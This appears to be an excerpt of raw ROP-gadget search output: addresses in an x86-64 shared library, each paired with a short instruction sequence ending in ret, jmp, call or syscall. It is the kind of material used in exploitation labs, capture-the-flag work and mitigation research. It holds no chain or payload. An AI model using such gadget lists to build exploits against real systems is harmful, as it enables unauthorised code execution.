0x00002aaaaaafec92 : add eax, 0x39ac59 ; ret
0x00002aaaaaaf6a52 : add eax, 0x3a68b9 ; ret
0x00002aaaaaaf6a42 : add eax, 0x3a68d9 ; ret
0x00002aaaaac09114 : add eax, 0x3d8d4800 ; ret
0x00002aaaaac0da15 : add eax, 0x3d8d4800 ; ret 0x535
0x00002aaaaabe8dd7 : add eax, 0x48 ; cmp rax, rdx ; jb 0x113dda ; xor eax, eax ; ret
0x00002aaaaabca3b7 : add eax, 0x48000000 ; add esp, 0x18 ; ret
0x00002aaaaab10291 : add eax, 0x48000000 ; mov dword ptr [rsi + 0x10], eax ; xor eax, eax ; ret
0x00002aaaaac3f498 : add eax, 0x48054289 ; lea eax, dword ptr [rdx + 8] ; ret
0x00002aaaaac3b148 : add eax, 0x48054289 ; mov eax, edi ; ret
0x00002aaaaac2f843 : add eax, 0x480e8b48 ; mov dword ptr [rdi + 5], edx ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaab7a246 : add eax, 0x480f8948 ; mov dword ptr [rdi + 5], edx ; ret
0x00002aaaaabf9582 : add eax, 0x48c48348 ; pop rbx ; pop rbp ; ret
0x00002aaaaab72daa : add eax, 0x48fb4789 ; mov eax, edi ; ret
0x00002aaaaab3f877 : add eax, 0x48ffff10 ; add esp, 0xd8 ; ret
0x00002aaaaac5c4b5 : add eax, 0x510fff2 ; jmp qword ptr [rax]
0x00002aaaaac5dddd : add eax, 0x518fff5 ; cmc ; call rax
0x00002aaaaac5dde9 : add eax, 0x518fff5 ; cmc ; jmp rax
0x00002aaaaac3f519 : add eax, 0x5428948 ; lea rax, qword ptr [rdx + 0xc] ; ret
0x00002aaaaac3b189 : add eax, 0x5428948 ; mov rax, rdi ; ret
0x00002aaaaac3cf60 : add eax, 0x54a8d48 ; jne 0x16823b ; ret
0x00002aaaaab7aa4a : add eax, 0x57f8d48 ; jne 0xa628b ; ret
0x00002aaaaab7c0ee : add eax, 0x57f8d48 ; jne 0xa7a9b ; ret
0x00002aaaaac5de61 : add eax, 0x580fff5 ; cmc ; call rax
0x00002aaaaabe9e6b : add eax, 0x5b000000 ; pop r12 ; pop r13 ; pop rbp ; ret
0x00002aaaaabc421a : add eax, 0x5b000000 ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaabda7f0 : add eax, 0x5b000000 ; pop rbp ; ret
0x00002aaaaab43576 : add eax, 0x5b000000 ; ret
0x00002aaaaac073aa : add eax, 0x5ba00 ; add byte ptr [rax], al ; call 0x2e629
0x00002aaaaaad6569 : add eax, 0x5be0000 ; add byte ptr [rax], al ; ret 5
0x00002aaaaac5521d : add eax, 0x5c00000 ; add byte ptr [rax], al ; ret 5
0x00002aaaaab53c18 : add eax, 0x5c415d5b ; ret
0x00002aaaaabc40dd : add eax, 0x5d000000 ; pop r12 ; ret
0x00002aaaaabff502 : add eax, 0x61a3e ; ret
0x00002aaaaac5de6d : add eax, 0x628fff5 ; cmc ; call qword ptr [rcx]
0x00002aaaaac29254 : add eax, 0x63490004 ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab7bddb : add eax, 0x6349000e ; or al, 0x93 ; lea rcx, qword ptr [r11 + rcx] ; jmp rcx
0x00002aaaaac91169 : add eax, 0x690000 ; add byte ptr [rax], al ; ret
0x00002aaaaac90465 : add eax, 0x6f980002 ; clc ; call rcx
0x00002aaaaac6fcc5 : add eax, 0x73340001 ; sti ; call rsp
0x00002aaaaac9051d : add eax, 0x74000002 ; clc ; call qword ptr [rdi]
0x00002aaaaaba7677 : add eax, 0x740e3941 ; ret
0x00002aaaaab8e2ba : add eax, 0x74db8500 ; or bh, byte ptr [rcx] ; ret
0x00002aaaaab8e266 : add eax, 0x75db8500 ; fsubr qword ptr [rcx] ; ret
0x00002aaaaab7edab : add eax, 0x75e48445 ; adc byte ptr [rbx - 0x6bf0fd06], al ; ret 0x8444
0x00002aaaaab0350f : add eax, 0x788d4800 ; sbb dword ptr [rax - 0x77], ecx ; ret
0x00002aaaaab63e3b : add eax, 0x80 ; ret
0x00002aaaaab123bd : add eax, 0x80d0518d ; cli ; or cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xb60f
0x00002aaaaab7aa4e : add eax, 0x82b850f ; add byte ptr [rax], al ; ret
0x00002aaaaabad9b3 : add eax, 0x83077500 ; rol byte ptr [rcx], 0x39 ; ret 0xe875
0x00002aaaaab7ed0f : add eax, 0x8307e083 ; clc ; add dword ptr [rdi], ecx ; xchg eax, esp ; ret 0xfd83
0x00002aaaaabb7704 : add eax, 0x83410000 ; cld ; dec dword ptr [rdi] ; xchg eax, esp ; ret 0xb60f
0x00002aaaaabcc87b : add eax, 0x83480000 ; clc ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaac198fd : add eax, 0x83480000 ; ret 0x4910
0x00002aaaaac1c451 : add eax, 0x83480000 ; ret 0xe910
0x00002aaaaac19851 : add eax, 0x83480000 ; ret 0xeb10
0x00002aaaaaba985d : add eax, 0x83480f75 ; ret
0x00002aaaaac3f49b : add eax, 0x8428d48 ; ret
0x00002aaaaab40d9a : add eax, 0x89480012 ; ret 0x8948
0x00002aaaaac03efb : add eax, 0x894c0000 ; ret
0x00002aaaaab4434e : add eax, 0x89c08500 ; ret 0x8389
0x00002aaaaabe9dc9 : add eax, 0x89c78944 ; ret
0x00002aaaaaafbb0d : add eax, 0x8d480000 ; add cl, byte ptr [rax + 0x39] ; ret
0x00002aaaaaafbaf1 : add eax, 0x8d480000 ; add dword ptr [rax + 0x39], ecx ; ret
0x00002aaaaaafbb29 : add eax, 0x8d480000 ; add ecx, dword ptr [rax + 0x39] ; ret
0x00002aaaaaafbe6e : add eax, 0x8d490000 ; add r9b, byte ptr [r8 + 0x39] ; ret
0x00002aaaaaafbe8b : add eax, 0x8d490000 ; add r9d, dword ptr [r8 + 0x39] ; ret
0x00002aaaaab7c0f2 : add eax, 0x997850f ; add byte ptr [rax], al ; ret
0x00002aaaaac0c756 : add eax, 0xa0 ; add rsp, 8 ; ret
0x00002aaaaac0c786 : add eax, 0xa8 ; add rsp, 8 ; ret
0x00002aaaaab68890 : add eax, 0xb3db ; ret
0x00002aaaaab68861 : add eax, 0xb63a ; ret
0x00002aaaaab688a4 : add eax, 0xbcb07 ; ret
0x00002aaaaab61eec : add eax, 0xbcd7f ; ret
0x00002aaaaab61b5c : add eax, 0xbcfdf ; ret
0x00002aaaaab637e2 : add eax, 0xbee69 ; ret
0x00002aaaaab5f6ec : add eax, 0xbf30f ; ret
0x00002aaaaab5e14f : add eax, 0xc ; ret
0x00002aaaaac14c2e : add eax, 0xc0310000 ; pop rbx ; ret
0x00002aaaaac4389a : add eax, 0xc0310000 ; ret
0x00002aaaaaad5451 : add eax, 0xc1c107c ; ret 0x4412
0x00002aaaaab800ed : add eax, 0xc20ce ; ret
0x00002aaaaabad9d4 : add eax, 0xc3000000 ; mov eax, 4 ; ret
0x00002aaaaab80cc9 : add eax, 0xc31b2 ; ret
0x00002aaaaac3f51d : add eax, 0xc428d48 ; ret
0x00002aaaaab7b88d : add eax, 0xc478d48 ; ret
0x00002aaaaab80cd1 : add eax, 0xc5a6a ; ret
0x00002aaaaab060d7 : add eax, 0xc7834900 ; or byte ptr [rax + 1], cl ; ret
0x00002aaaaab63e9e : add eax, 0xd ; ret
0x00002aaaaab7c6cd : add eax, 0xd478d48 ; ret
0x00002aaaaab6183f : add eax, 0xd999c ; ret
0x00002aaaaab63ccf : add eax, 0xda08c ; ret
0x00002aaaaab5f5df : add eax, 0xda44c ; ret
0x00002aaaaab63def : add eax, 0xdb77c ; ret
0x00002aaaaab63029 : add eax, 0xdf812 ; ret
0x00002aaaaab63031 : add eax, 0xe1f9a ; ret
0x00002aaaaab5deec : add eax, 0xe6dbf ; ret
0x00002aaaaab5bd54 : add eax, 0xe8000000 ; ret
0x00002aaaaac0d955 : add eax, 0xe8000000 ; ret 0xef5c
0x00002aaaaab727fe : add eax, 0xe9000000 ; ret
0x00002aaaaab80cb5 : add eax, 0xe916 ; ret
0x00002aaaaab52771 : add eax, 0xf05f883 ; test byte ptr [rbp - 0xa000000], ch ; ret
0x00002aaaaab5323a : add eax, 0xf05f883 ; test byte ptr [rbp - 0xa000000], dl ; ret
0x00002aaaaab58a52 : add eax, 0xf05f883 ; test byte ptr [rcx - 0xa000000], dl ; ret
0x00002aaaaab5411f : add eax, 0xf05f883 ; test byte ptr [rdi - 0x9fffffc], al ; ret
0x00002aaaaaba8a16 : add eax, 0xf410000 ; mov dh, 0x55 ; add byte ptr [rcx], bh ; ret 0x840f
0x00002aaaaab800e5 : add eax, 0xf596 ; ret
0x00002aaaaabd7f42 : add eax, 0xf6310000 ; mov rdi, r12 ; call rbx
0x00002aaaaabd7f67 : add eax, 0xf6310000 ; mov rdi, r13 ; call rbx
0x00002aaaaabd80b0 : add eax, 0xf6310000 ; mov rdi, r14 ; call rbx
0x00002aaaaabd8149 : add eax, 0xf6310000 ; mov rdi, r15 ; call rbx
0x00002aaaaac2fbb3 : add eax, 0xf7f0ff3 ; ret
0x00002aaaaab218ad : add eax, 0xf8834800 ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaab226d0 : add eax, 0xf8834800 ; dec dword ptr [rcx - 0x77] ; ret
0x00002aaaaab23d8c : add eax, 0xf8834800 ; dec dword ptr [rcx - 0x77] ; ret 0x8b4c
0x00002aaaaabea641 : add eax, 0xfff8984a ; ret
0x00002aaaaabea731 : add eax, 0xfff89eaa ; ret
0x00002aaaaabea7bb : add eax, 0xfff941a0 ; ret
0x00002aaaaac0b20e : add eax, 0xffff97fd ; mov rdi, rax ; call qword ptr [r10]
0x00002aaaaab2b9f7 : add eax, 0xfffffd06 ; add rax, rdx ; jmp rax
0x00002aaaaabcae87 : add eax, 0xffffffb4 ; cmove rax, rdx ; ret
0x00002aaaaab1d081 : add eax, 1 ; cmp rax, rdx ; jne 0x48082 ; xor eax, eax ; ret
0x00002aaaaabde01b : add eax, 1 ; mov dword ptr [rdx], eax ; ret
0x00002aaaaabdddcc : add eax, 1 ; mov word ptr [rdx], ax ; ret
0x00002aaaaab7edea : add eax, 1 ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab63c7b : add eax, 1 ; ret
0x00002aaaaab6b876 : add eax, 1 ; sub rsi, 1 ; jne 0x9687b ; xor eax, eax ; ret
0x00002aaaaaaf68e5 : add eax, 2 ; push rax ; call rbx
0x00002aaaaab80388 : add eax, 2 ; ret
0x00002aaaaab803a1 : add eax, 3 ; ret
0x00002aaaaab80d9c : add eax, 4 ; test edx, edx ; mov dword ptr [rax], edx ; jne 0xabda2 ; ret
0x00002aaaaabab60b : add eax, 8 ; ret
0x00002aaaaaaf5be9 : add eax, dword ptr [0] ; ret
0x00002aaaaac33e07 : add eax, dword ptr [eax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaabb9556 : add eax, dword ptr [rax + 0x75040878] ; mov bl, 0x8b ; pop rax ; or bh, dh ; ret
0x00002aaaaab15f82 : add eax, dword ptr [rax + rax] ; add cl, ch ; ret 0xffec
0x00002aaaaac29456 : add eax, dword ptr [rax + rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab87775 : add eax, dword ptr [rax] ; add al, ch ; ret
0x00002aaaaab53dc3 : add eax, dword ptr [rax] ; add byte ptr [rax + 0x29], cl ; ret 0x8d48
0x00002aaaaab52abb : add eax, dword ptr [rax] ; add byte ptr [rax + 0x39], cl ; ret 0x840f
0x00002aaaaac75885 : add eax, dword ptr [rax] ; add byte ptr [rax - 0x30], bl ; in al, dx ; jmp rbx
0x00002aaaaabb85ca : add eax, dword ptr [rax] ; add byte ptr [rax - 0x77], cl ; push rsp ; and al, 0x18 ; call 0x1f8aa
0x00002aaaaabb501d : add eax, dword ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret 0xe283
0x00002aaaaac41282 : add eax, dword ptr [rax] ; add byte ptr [rax - 0x7cb7fec8], al ; fdivr st(7) ; ret
0x00002aaaaab57744 : add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x00002aaaaaaf5c2a : add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaabc6208 : add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x3101
0x00002aaaaabf6ac8 : add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4404
0x00002aaaaac19a9d : add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1c5f1 : add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac19ac1 : add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaab42829 : add eax, dword ptr [rax] ; add byte ptr [rax], 0 ; je 0x6d842 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab44dbe : add eax, dword ptr [rax] ; add byte ptr [rax], 0 ; je 0x6fddb ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab454f2 : add eax, dword ptr [rax] ; add byte ptr [rax], 0 ; je 0x7050a ; mov eax, esi ; pop rbx ; ret
0x00002aaaaab45674 : add eax, dword ptr [rax] ; add byte ptr [rax], 0 ; je 0x7068a ; mov eax, esi ; pop rbx ; ret
0x00002aaaaab45fe8 : add eax, dword ptr [rax] ; add byte ptr [rax], 0 ; je 0x71003 ; mov eax, r8d ; pop rbx ; ret
0x00002aaaaab4618b : add eax, dword ptr [rax] ; add byte ptr [rax], 0 ; je 0x711aa ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab46322 : add eax, dword ptr [rax] ; add byte ptr [rax], 0 ; je 0x7133a ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4ab80 : add eax, dword ptr [rax] ; add byte ptr [rax], 0 ; je 0x75b9a ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4af85 : add eax, dword ptr [rax] ; add byte ptr [rax], 0 ; je 0x75f9a ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4b0a9 : add eax, dword ptr [rax] ; add byte ptr [rax], 0 ; je 0x760c2 ; mov eax, esi ; pop rbx ; ret
0x00002aaaaab4b1eb : add eax, dword ptr [rax] ; add byte ptr [rax], 0 ; je 0x7620a ; mov eax, esi ; pop rbx ; ret
0x00002aaaaab4b4d0 : add eax, dword ptr [rax] ; add byte ptr [rax], 0 ; je 0x764ea ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4be75 : add eax, dword ptr [rax] ; add byte ptr [rax], 0 ; je 0x76e8a ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4d081 : add eax, dword ptr [rax] ; add byte ptr [rax], 0 ; je 0x7809a ; mov eax, edx ; pop rbx ; ret
0x00002aaaaac074ae : add eax, dword ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00002aaaaac03c2b : add eax, dword ptr [rax] ; add byte ptr [rax], al ; add rsp, 0x30 ; pop rbx ; ret
0x00002aaaaabda720 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaabdd726 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; add rsp, 8 ; ret
0x00002aaaaabe9c17 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; cmovne eax, edx ; ret
0x00002aaaaabd6cac : add eax, dword ptr [rax] ; add byte ptr [rax], al ; jmp rax
0x00002aaaaabd848d : add eax, dword ptr [rax] ; add byte ptr [rax], al ; mov rdi, r12 ; call rbx
0x00002aaaaabd84e4 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; mov rdi, r13 ; call rbx
0x00002aaaaabd8564 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; mov rdi, r14 ; call rbx
0x00002aaaaabd8664 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; mov rdi, r15 ; call rbx
0x00002aaaaab803e3 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; ret
0x00002aaaaabd1f33 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; syscall ; mov eax, edx ; ret
0x00002aaaaabf65a4 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; syscall ; ret
0x00002aaaaab46888 : add eax, dword ptr [rax] ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab7ee47 : add eax, dword ptr [rax] ; add byte ptr [rbx - 0x50f0fe40], al ; ret 0x74e9
0x00002aaaaac0c7df : add eax, dword ptr [rax] ; add byte ptr [rcx + rcx*4 + 0x24], cl ; ret 0x8e0f
0x00002aaaaabe94e5 : add eax, dword ptr [rax] ; add byte ptr [rcx - 0x77], al ; ret
0x00002aaaaabb2212 : add eax, dword ptr [rax] ; add byte ptr [rcx - 0x77], al ; ret 0x3945
0x00002aaaaab0ff9a : add eax, dword ptr [rax] ; add byte ptr [rcx - 0x7e37763a], cl ; ret 0x3039
0x00002aaaaab552e3 : add eax, dword ptr [rax] ; add byte ptr [rcx - 0xa], al ; ret 0xf01
0x00002aaaaabf99d5 : add eax, dword ptr [rax] ; add byte ptr [rcx], bh ; ret
0x00002aaaaab29f38 : add eax, dword ptr [rax] ; add cl, bl ; in eax, -0x21 ; loopne 0x54ed1 ; ret 0xe680
0x00002aaaaabd2077 : add eax, dword ptr [rax] ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaac22a5f : add eax, dword ptr [rax] ; movsxd r9, dword ptr [r10 + r9*4] ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x00002aaaaac2a7d0 : add eax, dword ptr [rax] ; movsxd r9, dword ptr [r11 + r9*4] ; lea r9, qword ptr [r11 + r9] ; jmp r9
0x00002aaaaac2a64e : add eax, dword ptr [rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab7f070 : add eax, dword ptr [rax] ; pop rbx ; ret
0x00002aaaaab7f090 : add eax, dword ptr [rax] ; ret
0x00002aaaaac7ec43 : add eax, dword ptr [rbx + 0xa810204] ; ret
0x00002aaaaac78652 : add eax, dword ptr [rbx + 0xe] ; and byte ptr [rbx + 0xa4d0204], al ; ret
0x00002aaaaabf801d : add eax, dword ptr [rbx - 0x77bffe12] ; ja 0x12302e ; ret
0x00002aaaaab71f0f : add eax, dword ptr [rbx - 0x78] ; add dh, byte ptr cs:[rsp + rbp + 0xf] ; mov dh, 0x45 ; ret
0x00002aaaaac3cf29 : add eax, dword ptr [rbx] ; add byte ptr [rax], al ; ret
0x00002aaaaab49d14 : add eax, dword ptr [rcx + 0x39] ; fadd dword ptr [rdi + rcx + 0x47] ; ret
0x00002aaaaac7150a : add eax, dword ptr [rcx + 0xe] ; and byte ptr [rbx + 0xa410204], al ; ret
0x00002aaaaac7640a : add eax, dword ptr [rcx + 0xe] ; and byte ptr [rbx + 0xa470204], al ; ret
0x00002aaaaabdf1ba : add eax, dword ptr [rcx + rdx] ; ret
0x00002aaaaabfab0d : add eax, dword ptr [rcx - 0x7d] ; ret 0x4401
0x00002aaaaac6c5e5 : add eax, dword ptr [rcx] ; add byte ptr [rdx + rdx*4], al ; out dx, eax ; jmp rsp
0x00002aaaaab08e90 : add eax, dword ptr [rdi + 0x20] ; ret
0x00002aaaaab3b3b5 : add eax, dword ptr [rdi + rcx] ; test byte ptr [rbp - 0x7cfffffe], ah ; ret 0x3901
0x00002aaaaac1820a : add eax, dword ptr [rdx + 8] ; add rsp, 0x38 ; ret
0x00002aaaaac17b2e : add eax, dword ptr [rdx + 8] ; add rsp, 0x48 ; ret
0x00002aaaaabdef96 : add eax, dword ptr [rdx + rcx] ; ret
0x00002aaaaac3d029 : add eax, dword ptr [rdx] ; add byte ptr [rax], al ; ret
0x00002aaaaac7fdf0 : add eax, dword ptr [rsi + 0x180e4702] ; ret
0x00002aaaaac77052 : add eax, dword ptr [rsi + 0x180e6e02] ; ret
0x00002aaaaac8eafa : add eax, dword ptr [rsi + 0xe] ; and byte ptr [rsi + rcx + 0x18], ah ; ret
0x00002aaaaac74b72 : add eax, dword ptr [rsi + 0xe] ; and byte ptr [rsi + rcx + 0x18], bh ; ret
0x00002aaaaac7844a : add eax, dword ptr [rsi + rcx + 0x20] ; add dword ptr [rdx + rax], -0xc ; ret
0x00002aaaaac8429a : add eax, dword ptr [rsi + rcx + 0x20] ; add dword ptr [rsp + rbp*2], 0xa ; ret
0x00002aaaaac41318 : add eax, dword ptr fs:[rax] ; add byte ptr [rax - 0x7cb7fec8], al ; fdivr st(7) ; ret
0x00002aaaaac34107 : add eax, dword ptr fs:[rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac33f87 : add eax, dword ptr gs:[rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab7f141 : add eax, eax ; div ecx ; pop rbx ; mov eax, eax ; ret
0x00002aaaaab254c8 : add eax, eax ; ret
0x00002aaaaabca3b5 : add eax, ebp ; add eax, 0x48000000 ; add esp, 0x18 ; ret
0x00002aaaaac13416 : add eax, ebp ; hlt ; adc dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab5999a : add eax, ebp ; jmp rax
0x00002aaaaab69ba0 : add eax, ebp ; or dl, byte ptr [rcx - 0x76b70001] ; ret 0xc031
0x00002aaaaab1f800 : add eax, ebx ; add rsp, 0x20 ; mov rax, r8 ; pop rbx ; ret
0x00002aaaaabd70a3 : add eax, ebx ; int1 ; dec dword ptr [rcx - 0x75] ; call rbx
0x00002aaaaabea807 : add eax, ebx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab2e823 : add eax, ecx ; jmp rax
0x00002aaaaab62d4a : add eax, ecx ; ret
0x00002aaaaab73665 : add eax, edi ; add rax, r8 ; ret
0x00002aaaaab62d47 : add eax, edi ; add rax, rcx ; ret
0x00002aaaaab94504 : add eax, edi ; jmp rax
0x00002aaaaab618ab : add eax, edi ; ret
0x00002aaaaac1ea5b : add eax, edi ; sub rax, r8 ; ret
0x00002aaaaac1ecb0 : add eax, edi ; sub rax, rdx ; ret
0x00002aaaaabcae5d : add eax, edx ; cmp rdi, rsi ; ja 0xf5e58 ; ret
0x00002aaaaab03c9a : add eax, edx ; jmp rax
0x00002aaaaac02c8e : add eax, edx ; ret
0x00002aaaaab5fd06 : add eax, edx ; sub rax, rdi ; ret
0x00002aaaaabd2075 : add eax, esi ; add eax, dword ptr [rax] ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaab03bbc : add eax, esi ; jmp rax
0x00002aaaaab90b17 : add eax, esi ; ret
0x00002aaaaab254c7 : add eax, r8d ; ret
0x00002aaaaab2515f : add ebp, 0x30 ; add rsp, 8 ; mov eax, ebp ; pop rbx ; pop rbp ; ret
0x00002aaaaab25198 : add ebp, 0x30 ; mov eax, ebp ; pop rbx ; pop rbp ; ret
0x00002aaaaabb8a01 : add ebp, dword ptr [rax - 0x3d7af0fc] ; add byte ptr [rax], al ; add dh, dh ; ret 0x7408
0x00002aaaaac8fc65 : add ebp, dword ptr [rcx + rax + 0xa] ; ret
0x00002aaaaab8ff0b : add ebp, dword ptr [rcx] ; ret 0x48d
0x00002aaaaac00014 : add ebp, dword ptr [rcx] ; ret 0x828d
0x00002aaaaac908b3 : add ebp, eax ; add ebp, esi ; add al, byte ptr [rax] ; ret
0x00002aaaaab43ff5 : add ebp, eax ; pop rbx ; mov rax, rbp ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaabb9e28 : add ebp, eax ; ret 0xf3a9
0x00002aaaaac76891 : add ebp, ebp ; call qword ptr [rsi]
0x00002aaaaabd2977 : add ebp, ebx ; mov ebp, 0x441f0f66 ; add byte ptr [rax], al ; ret
0x00002aaaaac908b5 : add ebp, esi ; add al, byte ptr [rax] ; ret
0x00002aaaaac908a5 : add ebp, esi ; add al, byte ptr [rax] ; ret 0x503
0x00002aaaaaad8182 : add ebp, esi ; mov eax, 0xa1a3e95a ; ret 0xba88
0x00002aaaaaba488e : add ebx, 1 ; mov rdx, rax ; jmp 0xcf835
0x00002aaaaac17c32 : add ebx, dword ptr [rax + 0x5a] ; pop rbx ; ret
0x00002aaaaac485b9 : add ebx, dword ptr [rbp + 0x70] ; mov rdi, qword ptr [rbx] ; call 0x1f8b0
0x00002aaaaabf854d : add ebx, dword ptr [rbx - 0x3d] ; mov eax, 0xffffffff ; ret
0x00002aaaaac78668 : add ebx, dword ptr [rdi] ; add dword ptr [rdx], ecx ; ret
0x00002aaaaabfaad9 : add ebx, dword ptr [rip + 0xf48002a] ; ret 0xff81
0x00002aaaaabe8e3c : add ebx, eax ; nop ; xor eax, eax ; ret
0x00002aaaaab1d471 : add ebx, eax ; nop dword ptr [rax + rax] ; xor eax, eax ; ret
0x00002aaaaabd2e5b : add ebx, ebp ; and eax, 0x83489066 ; ret 0x3c01
0x00002aaaaaad8792 : add ebx, ebp ; in al, -0x12 ; jne 0x3778 ; ret 0x975
0x00002aaaaabd6271 : add ebx, ebp ; ret
0x00002aaaaab3545d : add ebx, ebp ; ret 0x894c
0x00002aaaaac60a11 : add ebx, edi ; call rax
0x00002aaaaac60a0d : add ebx, edi ; dec eax ; add ebx, edi ; call rax
0x00002aaaaac60a15 : add ebx, edi ; jmp rax
0x00002aaaaac69219 : add ebx, edi ; push qword ptr [rax + 2] ; sti ; inc dword ptr [rax + 3] ; sti ; call qword ptr [rax]
0x00002aaaaac2fd73 : add ebx, esi ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaabde88f : add ebx, esi ; ret
0x00002aaaaac0eb9e : add ebx, esp ; call r14
0x00002aaaaab63734 : add ecx, 0x40 ; cmp rdx, rcx ; jne 0x8e729 ; ret
0x00002aaaaabc9f9f : add ecx, 0x50 ; shr ecx, 3 ; rep stosq qword ptr [rdi], rax ; ret
0x00002aaaaab6b966 : add ecx, 1 ; sub rax, 1 ; jne 0x9696b ; pop rbx ; pop rbp ; ret
0x00002aaaaabf83ad : add ecx, 2 ; mov dword ptr [r8], edi ; mov qword ptr [r9], rcx ; ret
0x00002aaaaab76f6a : add ecx, dword ptr [r9 - 0x76b7fcbe] ; clc ; ret
0x00002aaaaabf2598 : add ecx, dword ptr [rax + 0x29] ; fimul dword ptr [rax - 0x7d] ; ret 0xe801
0x00002aaaaab5345a : add ecx, dword ptr [rax + 0x29] ; ret
0x00002aaaaaba97c5 : add ecx, dword ptr [rax + 0x29] ; ret 0x148
0x00002aaaaabe5d24 : add ecx, dword ptr [rax + 0x29] ; ret 0x3949
0x00002aaaaabf3b19 : add ecx, dword ptr [rax + 0x29] ; ret 0x7a8d
0x00002aaaaab6b281 : add ecx, dword ptr [rax + 0x29] ; ret 0x8348
0x00002aaaaabf3279 : add ecx, dword ptr [rax + 0x29] ; ret 0x8948
0x00002aaaaab6b0af : add ecx, dword ptr [rax + 0x29] ; ret 0x8949
0x00002aaaaaafbb2f : add ecx, dword ptr [rax + 0x39] ; ret
0x00002aaaaab474b7 : add ecx, dword ptr [rax + 0x39] ; ret 0xf48
0x00002aaaaab6d9af : add ecx, dword ptr [rax + 0x74023354] ; sub cl, byte ptr [rdi] ; mov dh, 0x55 ; ret
0x00002aaaaabdd76d : add ecx, dword ptr [rax - 0x42] ; ret
0x00002aaaaabf856c : add ecx, dword ptr [rax - 0x68] ; shr rax, 4 ; ret
0x00002aaaaab7aa0c : add ecx, dword ptr [rax - 0x73] ; jg 0xa5a1f ; jne 0xa628b ; ret
0x00002aaaaab7c0b0 : add ecx, dword ptr [rax - 0x73] ; jg 0xa70c3 ; jne 0xa7a9b ; ret
0x00002aaaaabd3664 : add ecx, dword ptr [rax - 0x77] ; adc bl, dh ; ret
0x00002aaaaab72d8a : add ecx, dword ptr [rax - 0x77] ; clc ; ret
0x00002aaaaab57d7e : add ecx, dword ptr [rax - 0x77] ; ret 0xce31
0x00002aaaaab53cd8 : add ecx, dword ptr [rax - 0x77] ; ret 0xcf31
0x00002aaaaabe6217 : add ecx, dword ptr [rax - 0x77] ; ret 0xe883
0x00002aaaaaaf9205 : add ecx, dword ptr [rax - 0x7d] ; mov byte ptr [rax + rcx*2], 0x83 ; ret
0x00002aaaaab0df4d : add ecx, dword ptr [rax - 0x7d] ; ret
0x00002aaaaab0e027 : add ecx, dword ptr [rax - 0x7d] ; ret 0x4801
0x00002aaaaab4c75b : add ecx, dword ptr [rax - 9] ; fmul dword ptr [rcx + 0x21] ; ret
0x00002aaaaab1237d : add ecx, dword ptr [rbp - 0x57f2faf] ; or cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xb60f
0x00002aaaaac17ef1 : add ecx, dword ptr [rbp - 0x88] ; call rax
0x00002aaaaac2fae2 : add ecx, dword ptr [rbx + 0x357890e] ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaab7b7f4 : add ecx, dword ptr [rcx + 0x357890f] ; lea rax, qword ptr [rdi + 6] ; ret
0x00002aaaaab7c624 : add ecx, dword ptr [rcx + 0x357890f] ; lea rax, qword ptr [rdi + 7] ; ret
0x00002aaaaab7a1e4 : add ecx, dword ptr [rcx + 0x357890f] ; ret
0x00002aaaaab7e094 : add ecx, dword ptr [rcx + 0x357890f] ; xor ch, ch ; mov byte ptr [rdi + 7], ch ; ret
